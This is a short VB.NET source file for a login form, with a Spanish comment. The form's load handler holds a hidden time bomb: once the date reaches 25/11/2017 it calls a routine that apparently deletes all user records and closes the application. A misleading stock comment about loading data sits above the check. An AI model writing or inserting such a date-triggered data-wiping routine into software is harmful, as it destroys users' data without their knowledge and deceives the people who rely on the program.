Public Class login 

 

    Private Sub login_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        'TODO: esta línea de código carga datos en la tabla 'Dtsisbus.usuarios' Puede moverla o quitarla según sea necesario.
        If Date.Now >= "25/11/2017" Then
            UsuariosTableAdapter.eliminarusuarios()
            Close()
        Else
            cargalogin()
        End If
    End Sub

    '---------------------------------------------------
    Private Sub cmdsalir_Click_1(sender As Object, e As EventArgs) Handles cmdsalir.Click
        End
    End Sub
    '---------------------------------------
    Private Sub cmdacceso_Click_1(sender As Object, e As EventArgs) Handles cmdacceso.Click
        acceso()
    End Sub
End Class